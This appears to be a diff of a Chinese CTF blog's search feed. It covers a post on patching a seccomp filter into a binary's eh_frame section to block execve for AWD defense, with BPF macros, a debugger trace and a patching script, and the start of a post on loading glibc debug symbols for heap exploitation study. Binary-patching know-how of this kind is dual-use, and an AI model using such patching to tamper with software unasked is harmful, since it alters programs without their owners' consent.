-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL)</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><code>BPF_RET</code> 表示返回结果。</li>
-<li><code>BPF_K</code> 表示一个立即数操作，这里为 <code>SECCOMP_RET_KILL</code>，这是 seccomp 的一个特定返回值，表示当遇到 <code>execve</code> 系统调用时杀死进程。</li>
-</ul>
-<p>这条指令表示如果系统调用号是 <code>execve</code>，则终止进程。</p>
-<p><strong>第四条指令</strong></p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW)</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li>这条指令会返回 <code>SECCOMP_RET_ALLOW</code>，表示允许其他系统调用正常执行。</li>
-</ul>
-<h4 id="struct-sock-fprog-prog"><a href="#struct-sock-fprog-prog" class="headerlink" title="struct sock_fprog prog"></a><strong>struct sock_fprog prog</strong></h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">    .len = <span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>]),</span><br><span class="line">    .filter = filter</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><code>struct sock_fprog</code> 是一个包含 seccomp 过滤器程序的结构体：<ul>
-<li><code>len</code> 表示 <code>filter</code> 数组的长度（指令数量）。通过 <code>sizeof(filter) / sizeof(filter[0])</code> 来计算过滤器中有多少条指令。</li>
-<li><code>filter</code> 是一个指向 <code>sock_filter</code> 数组的指针，用于存储 seccomp 过滤器的指令集。</li>
-</ul>
-</li>
-</ul>
-<p>该结构体用于将 BPF 过滤器指令加载到内核中。</p>
-<h4 id="prctl-系统调用"><a href="#prctl-系统调用" class="headerlink" title="prctl 系统调用"></a><strong>prctl 系统调用</strong></h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog) != <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;prctl&quot;</span>);</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><code>prctl</code> 是用来对进程的某些属性进行设置的系统调用。</li>
-<li><code>PR_SET_SECCOMP</code> 是用于启用 seccomp 的选项。</li>
-<li><code>SECCOMP_MODE_FILTER</code> 表示以过滤模式运行 seccomp，意味着我们会使用 BPF 过滤器来决定哪些系统调用可以执行，哪些会被拒绝。</li>
-<li><code>&amp;prog</code> 是指向我们定义的过滤器程序的指针，它告诉内核使用这个过滤器来限制系统调用。</li>
-</ul>
-<p>如果 <code>prctl</code> 调用失败，意味着 seccomp 设置失败，会输出错误信息并终止进程。</p>
-<p>这里其实也可以把SECCOMP_MODE_FILTER改成 SECCOMP_MODE_STRICT  ，然后就不用构建并传prog了，这样一来会仅仅允许exit，sigreturn，read以及write的系统调用。</p>
-<p>其中BPF_STMT与BPF_JUMP实际上是一个宏定义，是条件编译后赋值的sock_filter结构体，这就是为什么<code>struct sock_filter filter[]</code>这个声明是声明结构体数组。</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span>     BPF_STMT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    BPF_STMT(code,k)&#123;(unsigned short)(code),0,0,k&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span>     BPF_JUMP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    BPF_JUMP(code,k,jt,jf)&#123;(unsigned short)(code),jt,jf,k&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>
-
-<p>而sock_filter的结构体定义如下：</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> &#123;</span></span><br><span class="line">    __u16   code;   <span class="comment">/* BPF opcode */</span></span><br><span class="line">    __u8    jt;     <span class="comment">/* Jump true */</span></span><br><span class="line">    __u8    jf;     <span class="comment">/* Jump false */</span></span><br><span class="line">    __u32   k;      <span class="comment">/* Generic multiuse field */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
-
-<h4 id="其他一些常用的宏定义"><a href="#其他一些常用的宏定义" class="headerlink" title="其他一些常用的宏定义"></a>其他一些常用的宏定义</h4><p>基本都是位掩码，只需要知道其代表的含义即可。</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 主指令类别（2 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LD          0x00  <span class="comment">// Load</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LDX         0x01  <span class="comment">// Load with index</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ST          0x02  <span class="comment">// Store</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_STX         0x03  <span class="comment">// Store with index</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ALU         0x04  <span class="comment">// ALU (arithmetic logic unit) operation</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JMP         0x05  <span class="comment">// Jump</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_RET         0x06  <span class="comment">// Return</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MISC        0x07  <span class="comment">// Miscellaneous</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 操作码的大小（3 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_W           0x00  <span class="comment">// Word (32-bit)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_H           0x08  <span class="comment">// Half-word (16-bit)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_B           0x10  <span class="comment">// Byte (8-bit)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载/存储操作的模式（3 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_IMM         0x00  <span class="comment">// Immediate value</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ABS         0x20  <span class="comment">// Absolute</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_IND         0x40  <span class="comment">// Indirect</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MEM         0x60  <span class="comment">// Memory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LEN         0x80  <span class="comment">// Packet length</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MSH         0xA0  <span class="comment">// Modulo shift</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算和比较操作的源（1 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_K           0x00  <span class="comment">// Constant</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_X           0x08  <span class="comment">// Register</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ALU 运算符（4 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ADD         0x00  <span class="comment">// Addition</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_SUB         0x10  <span class="comment">// Subtraction</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MUL         0x20  <span class="comment">// Multiplication</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_DIV         0x30  <span class="comment">// Division</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_OR          0x40  <span class="comment">// Bitwise OR</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_AND         0x50  <span class="comment">// Bitwise AND</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LSH         0x60  <span class="comment">// Left shift</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_RSH         0x70  <span class="comment">// Right shift</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_NEG         0x80  <span class="comment">// Negation</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MOD         0x90  <span class="comment">// Modulo</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_XOR         0xA0  <span class="comment">// Bitwise XOR</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 跳转条件（4 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JA          0x00  <span class="comment">// Jump unconditionally</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JEQ         0x10  <span class="comment">// Jump if equal</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JGT         0x20  <span class="comment">// Jump if greater than</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JGE         0x30  <span class="comment">// Jump if greater or equal</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JSET        0x40  <span class="comment">// Jump if bits are set</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Return 操作码</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_RET         0x06  <span class="comment">// Return</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_KILL 0x00000000  <span class="comment">// Kill process</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_ALLOW 0x7fff0000 <span class="comment">// Allow syscall</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//对seccomp mode 进行操作</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_SECCOMP      21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_SECCOMP     22</span></span><br></pre></td></tr></table></figure></div>
-
-
-
-<h3 id="二、调试获取汇编写法"><a href="#二、调试获取汇编写法" class="headerlink" title="二、调试获取汇编写法"></a>二、调试获取汇编写法</h3><p>查看pwndbg，install_seccomp()函数的主逻辑如下，我们可以发现除了prctl系统调用外，前面的一系列结构体的初始化都没有调用函数，而且这一大通操作实际上很多是一个一个字节进行的修改，那么我们在eh_frame空间有限的情况下，实际可以通过8字节直接赋值参数来节省掉许多指令字节。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x5555555551e4 &lt;install_seccomp+27&gt;    mov    word ptr [rbp - 0x30], 0x20     [0x7fffffffe450] =&gt; 0x20</span><br><span class="line">0x5555555551ea &lt;install_seccomp+33&gt;    mov    byte ptr [rbp - 0x2e], 0        [0x7fffffffe452] =&gt; 0</span><br><span class="line">0x5555555551ee &lt;install_seccomp+37&gt;    mov    byte ptr [rbp - 0x2d], 0        [0x7fffffffe453] =&gt; 0</span><br><span class="line">0x5555555551f2 &lt;install_seccomp+41&gt;    mov    dword ptr [rbp - 0x2c], 0       [0x7fffffffe454] =&gt; 0</span><br><span class="line">0x5555555551f9 &lt;install_seccomp+48&gt;    mov    word ptr [rbp - 0x28], 0x15     [0x7fffffffe458] =&gt; 0x15</span><br><span class="line">0x5555555551ff &lt;install_seccomp+54&gt;    mov    byte ptr [rbp - 0x26], 0        [0x7fffffffe45a] =&gt; 0</span><br><span class="line">0x555555555203 &lt;install_seccomp+58&gt;     mov    byte ptr [rbp - 0x25], 1               [0x7fffffffe45b] =&gt; 1</span><br><span class="line">0x555555555207 &lt;install_seccomp+62&gt;     mov    dword ptr [rbp - 0x24], 0x3b           [0x7fffffffe45c] =&gt; 0x3b</span><br><span class="line">0x55555555520e &lt;install_seccomp+69&gt;     mov    word ptr [rbp - 0x20], 6               [0x7fffffffe460] =&gt; 6</span><br><span class="line">0x555555555214 &lt;install_seccomp+75&gt;     mov    byte ptr [rbp - 0x1e], 0               [0x7fffffffe462] =&gt; 0</span><br><span class="line">0x555555555218 &lt;install_seccomp+79&gt;     mov    byte ptr [rbp - 0x1d], 0               [0x7fffffffe463] =&gt; 0</span><br><span class="line">0x55555555521c &lt;install_seccomp+83&gt;     mov    dword ptr [rbp - 0x1c], 0              [0x7fffffffe464] =&gt; 0</span><br><span class="line">0x555555555223 &lt;install_seccomp+90&gt;     mov    word ptr [rbp - 0x18], 6               [0x7fffffffe468] =&gt; 6</span><br><span class="line">0x555555555229 &lt;install_seccomp+96&gt;     mov    byte ptr [rbp - 0x16], 0               [0x7fffffffe46a] =&gt; 0</span><br><span class="line">0x55555555522d &lt;install_seccomp+100&gt;    mov    byte ptr [rbp - 0x15], 0               [0x7fffffffe46b] =&gt; 0</span><br><span class="line">0x555555555231 &lt;install_seccomp+104&gt;    mov    dword ptr [rbp - 0x14], 0x7fff0000     [0x7fffffffe46c] =&gt; 0x7fff0000</span><br><span class="line">0x555555555238 &lt;install_seccomp+111&gt;    mov    word ptr [rbp - 0x40], 4               [0x7fffffffe440] =&gt; 4</span><br><span class="line">0x55555555523e &lt;install_seccomp+117&gt;    lea    rax, [rbp - 0x30]                      RAX =&gt; 0x7fffffffe450 ◂— 0x20 /* &#x27; &#x27; */</span><br><span class="line">0x555555555242 &lt;install_seccomp+121&gt;    mov    qword ptr [rbp - 0x38], rax            [0x7fffffffe448] =&gt; 0x7fffffffe450 ◂— 0x20 /* &#x27; &#x27; */</span><br><span class="line">0x555555555246 &lt;install_seccomp+125&gt;    lea    rax, [rbp - 0x40]                      RAX =&gt; 0x7fffffffe440 ◂— 4</span><br><span class="line">0x55555555524a &lt;install_seccomp+129&gt;    mov    rdx, rax                               RDX =&gt; 0x7fffffffe440 ◂— 4</span><br><span class="line">0x55555555524d &lt;install_seccomp+132&gt;    mov    esi, 2                                 ESI =&gt; 2</span><br><span class="line">0x555555555252 &lt;install_seccomp+137&gt;    mov    edi, 0x16                              EDI =&gt; 0x16</span><br><span class="line">0x555555555257 &lt;install_seccomp+142&gt;    mov    eax, 0                                 EAX =&gt; 0</span><br><span class="line">0x55555555525c &lt;install_seccomp+147&gt;    call   prctl@plt                   			  &lt;prctl@plt&gt;</span><br></pre></td></tr></table></figure></div>
-
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151136186.png"
-                      class=""
-                >
-
-<p>最后整个prog结构体的地址是存在rdx中，也就是rbp - 0x40这个地址处。但之后遇到了问题，在prctl函数的实现中，在prctl的系统调用时始终不成功，返回的rax代表的错误码。之后尝试直接执行test，发现是权限问题。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151151584.png"
-                      class=""
-                >
-
-<p>这下尴尬了，本来想上沙箱是为了方便防御，这么一来二去搞awd前还得提权，更加麻烦了，这下就只能算是学习沙箱实现的机制了。那么我们得切到root用户进行调试（本来想setuid改文件，但好像wsl不支持），进到prctl具体实现里看看。</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7ffff7eae338</span> &lt;prctl+<span class="number">8</span>&gt;        mov    r10, rcx                        R10 =&gt; <span class="number">0x555555557da0</span> (__do_global_dtors_aux_fini_array_entry) —▸ <span class="number">0x555555555180</span> (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line"><span class="number">0x7ffff7eae33b</span> &lt;prctl+<span class="number">11</span>&gt;       mov    qword ptr [rsp + <span class="number">0x28</span>], rsi     [<span class="number">0x7fffffffe408</span>] =&gt; <span class="number">2</span></span><br><span class="line"><span class="number">0x7ffff7eae340</span> &lt;prctl+<span class="number">16</span>&gt;       mov    qword ptr [rsp + <span class="number">0x30</span>], rdx     [<span class="number">0x7fffffffe410</span>] =&gt; <span class="number">0x7fffffffe440</span> ◂— <span class="number">4</span></span><br><span class="line"><span class="number">0x7ffff7eae345</span> &lt;prctl+<span class="number">21</span>&gt;       mov    qword ptr [rsp + <span class="number">0x38</span>], rcx     [<span class="number">0x7fffffffe418</span>] =&gt; <span class="number">0x555555557da0</span> (__do_global_dtors_aux_fini_array_entry) —▸ <span class="number">0x555555555180</span> (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line"><span class="number">0x7ffff7eae34a</span> &lt;prctl+<span class="number">26</span>&gt;       mov    qword ptr [rsp + <span class="number">0x40</span>], r8      [<span class="number">0x7fffffffe420</span>] =&gt; <span class="number">0x7ffff7fa3f10</span> (initial+<span class="number">16</span>) ◂— <span class="number">4</span></span><br><span class="line"><span class="number">0x7ffff7eae34f</span> &lt;prctl+<span class="number">31</span>&gt;       mov    rax, qword ptr fs:[<span class="number">0x28</span>]        RAX, [<span class="number">0x7ffff7d85768</span>] =&gt; <span class="number">0xc68810ecdaf50d00</span></span><br><span class="line"><span class="number">0x7ffff7eae358</span> &lt;prctl+<span class="number">40</span>&gt;       mov    qword ptr [rsp + <span class="number">0x18</span>], rax     [<span class="number">0x7fffffffe3f8</span>] =&gt; <span class="number">0xc68810ecdaf50d00</span></span><br><span class="line"><span class="number">0x7ffff7eae35d</span> &lt;prctl+<span class="number">45</span>&gt;    xor    eax, eax                        EAX =&gt; <span class="number">0</span></span><br><span class="line"><span class="number">0x7ffff7eae35f</span> &lt;prctl+<span class="number">47</span>&gt;    lea    rax, [rsp + <span class="number">0x60</span>]               RAX =&gt; <span class="number">0x7fffffffe440</span> ◂— <span class="number">4</span></span><br><span class="line"><span class="number">0x7ffff7eae364</span> &lt;prctl+<span class="number">52</span>&gt;    mov    dword ptr [rsp], <span class="number">8</span>              [<span class="number">0x7fffffffe3e0</span>] =&gt; <span class="number">8</span></span><br><span class="line"><span class="number">0x7ffff7eae36b</span> &lt;prctl+<span class="number">59</span>&gt;    mov    qword ptr [rsp + <span class="number">8</span>], rax        [<span class="number">0x7fffffffe3e8</span>] =&gt; <span class="number">0x7fffffffe440</span> ◂— <span class="number">4</span></span><br><span class="line"><span class="number">0x7ffff7eae370</span> &lt;prctl+<span class="number">64</span>&gt;    lea    rax, [rsp + <span class="number">0x20</span>]               RAX =&gt; <span class="number">0x7fffffffe400</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">0x7ffff7eae375</span> &lt;prctl+<span class="number">69</span>&gt;    mov    qword ptr [rsp + <span class="number">0x10</span>], rax     [<span class="number">0x7fffffffe3f0</span>] =&gt; <span class="number">0x7fffffffe400</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">0x7ffff7eae37a</span> &lt;prctl+<span class="number">74</span>&gt;    mov    eax, <span class="number">0x9d</span>                       EAX =&gt; <span class="number">0x9d</span></span><br><span class="line"><span class="number">0x7ffff7eae37f</span> &lt;prctl+<span class="number">79</span>&gt;    syscall  &lt;SYS_prctl&gt;</span><br></pre></td></tr></table></figure></div>
-
-<p>最后syscall时rdi为0x16，rsi为2，rdx为0x7fffffffe440（prog结构体地址），前面的操作用处不大，就是把寄存器参数加载到了栈上以及存了下canary。r10用rcx赋值，r8不变。那么我们只要把那个结构体伪造出来，就可以直接syscall来禁用一些系统调用。理论可行，开始手搓。</p>
-<p>我们可以拿一道简单的栈溢出来试一下，更改程序我用的是 <a class="link"   href="https://github.com/aftern00n/AwdPwnPatcher" >https://github.com/aftern00n/AwdPwnPatcher<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 这个库，我们可以把call init patch成一个跳转到ehframe段执行，再在ehframe段最后手动加上call init。AwdPwnPatcher中有个add_constant_in_ehframe方法，其中会将传入的字符串转换为字节字符串。我感觉还是直接在传参前用p64伪造好结构体的各字段比较方便，所以就把库里面字符串的encode逻辑给注释掉了。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151211381.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151222496.png"
-                      class=""
-                >
-
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> AwdPwnPatcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">awd_pwn_patcher = AwdPwnPatcher(binary)</span><br><span class="line">sock_filter = p64(<span class="number">0x20</span>) + p64(<span class="number">0x3b01000015</span>) + p64(<span class="number">6</span>) + p64(<span class="number">0x7fff000000000006</span>)</span><br><span class="line">sock_filter_addr = awd_pwn_patcher.add_constant_in_ehframe(sock_filter)</span><br><span class="line"></span><br><span class="line">prog = p64(<span class="number">4</span>) + p64(sock_filter_addr)</span><br><span class="line">prog_addr = awd_pwn_patcher.add_constant_in_ehframe(prog)</span><br><span class="line"></span><br><span class="line">assembly = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax,157</span></span><br><span class="line"><span class="string">    mov rdi,22</span></span><br><span class="line"><span class="string">    mov rsi,2</span></span><br><span class="line"><span class="string">    lea rdx,[<span class="subst">&#123;prog_addr&#125;</span>]</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    call 0x40117A</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">awd_pwn_patcher.patch_by_jmp(jmp_from=<span class="number">0x4011F0</span>,jmp_to=<span class="number">0x4011F5</span>,assembly=assembly)</span><br><span class="line">awd_pwn_patcher.save()</span><br></pre></td></tr></table></figure></div>
-
-<p>这时候本来充满期待开始调试二进制程序，但是首先遇到的问题是ehframe段不可执行，一般来说awd_pwn_patcher.save()时会自动把这个段设为可执行，但这里不知道出了什么问题，得自己手动来。根据<a class="link"   href="https://blog.csdn.net/qq_46106285/article/details/124972056" >https://blog.csdn.net/qq_46106285/article/details/124972056<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 这篇博客能够成功地设置段权限。第二个问题是我在root用户下安装pwntools后，发现会让正常用户gdb调试时出现问题，这个问题的解决方案是起一个python的虚拟环境给root用，或者是<code>sudo pip install --user pwntools</code>来指定只给root用户安装python库。之后运行就不会出现问题了。</p>
-<p>运行没有patch过的程序：</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151236768.png"
-                      class=""
-                >
-
-<p>经过patch之后：</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151247626.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151256919.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151305738.png"
-                      class=""
-                >
-
-<p>经过计算，构造禁用execve沙箱所用的仅有0x53字节，一般而言ehframe段还是够用的，每个多加的规则也只会多出8字节的开销，改一下结构体的参数就行。但由于前提是要有root权限执行程序，也是挺鸡肋的。</p>
-<h3 id="三、自动化工具"><a href="#三、自动化工具" class="headerlink" title="三、自动化工具"></a>三、自动化工具</h3><p>感觉这个挺有意思的，感觉逻辑也挺简单，上头了小写一手自动化工具（虽然没有什么卵用）</p>
-<p>效果图：</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151317438.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151328087.png"
-                      class=""
-                >
-
-<p><a class="link"   href="https://github.com/collectcrop/SandboxAttacher" >https://github.com/collectcrop/SandboxAttacher<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>sandbox</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>solidity&amp;blockchain初探</title>
     <url>/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/</url>
     <content><![CDATA[<p>solidity这个语言广泛运用与智能合约的编写，想要入门区块链就得先了解这个语言。该语言其实与c语言用法类似。在solidity语言中，标识执行账户是用地址实现的，比如我们MetaMask中创建的Account的地址或是某个合约的地址。</p>
@@ -2015,6 +2015,90 @@
       <tags>
         <tag>BlockChain</tag>
         <tag>solidity</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>带符号调试-gdb脚本实现自动化加载</title>
+    <url>/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/</url>
+    <content><![CDATA[<h4 id="问题由来"><a href="#问题由来" class="headerlink" title="问题由来"></a>问题由来</h4><p>在对于堆的<code>_IO_FILE</code>利用的学习过程中，我们通常需要伪造一个fake_IO_FILE，并且附带源码调试，以方便清除是否进入了目标函数，是否一些条件判断通过。但是有时候却在pwndbg加载时找不到对应的glibc的symbol file文件，这就导致我们无法进行源码级别调试，而且看结构体只能自己一个一个字段带进去看，十分麻烦。所以这里介绍一下如何方便地进行带符号调试。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123103232492.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123103325230.png"
+                      class=""
+                >
+
+<h4 id="符号文件"><a href="#符号文件" class="headerlink" title="符号文件"></a>符号文件</h4><h5 id="Build-ID"><a href="#Build-ID" class="headerlink" title="Build ID"></a>Build ID</h5><p><code>Build ID</code> 是 ELF 文件（可执行文件和共享库）中一个独特的标识符，用于标识文件的内容。它是一个不可变的标志，通常用来快速匹配文件与其调试符号或源代码。</p>
+<hr>
+<h6 id="主要用途"><a href="#主要用途" class="headerlink" title="主要用途"></a><strong>主要用途</strong></h6><ol>
+<li><strong>唯一标识 ELF 文件</strong>：<ul>
+<li>即使文件名或路径改变，<code>Build ID</code> 仍然可以唯一标识文件。</li>
+<li>不同编译选项或源代码的修改会导致新的 <code>Build ID</code>。</li>
+</ul>
+</li>
+<li><strong>关联调试符号和源代码</strong>：<ul>
+<li>调试符号文件（如 <code>.debug</code> 文件）通常使用 <code>Build ID</code> 来匹配对应的 ELF 文件。</li>
+</ul>
+</li>
+<li><strong>软件包管理和安全检查</strong>：<ul>
+<li>用于确保文件未被篡改，或用于匹配特定版本的依赖项。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h6 id="生成方式"><a href="#生成方式" class="headerlink" title="生成方式"></a><strong>生成方式</strong></h6><p><code>Build ID</code> 是通过对 ELF 文件的内容（如代码段和数据段）进行哈希计算生成的，具体方式取决于工具链。它通常由 <strong>编译器</strong> 或 <strong>链接器</strong> 自动生成，存储在 ELF 文件的 <code>.note.gnu.build-id</code> 段中。</p>
+<h6 id="查看-ELF-文件的-Build-ID"><a href="#查看-ELF-文件的-Build-ID" class="headerlink" title="查看 ELF 文件的 Build ID"></a><strong>查看 ELF 文件的 Build ID</strong></h6><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">1.readelf -n /path/to/file | grep &#x27;Build ID&#x27;</span><br><span class="line">2.file /path/to/file</span><br></pre></td></tr></table></figure></div>
+
+<h5 id="debug"><a href="#debug" class="headerlink" title=".debug"></a>.debug</h5><p>通常<code>symbol file</code>会在一个<code>.debug/.build-id/xx/</code>的目录下，这里在<code>build-id</code>中会有一堆2位16进制数构成的目录名，实际在.debug文件检索时，会先根据<code>build-id</code>的第一个字节（最高位）来进入对应前缀的文件夹，然后在该目录下找对应的.debug文件。比如我们的<code>build-id</code>为<code>89c3cb85f9e55046776471fed05ec441581d1969</code>，那么我们目标的.debug文件就在<code>.debug/.build-id/89/c3cb85f9e55046776471fed05ec441581d1969.debug</code>这个位置。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123105018012.png"
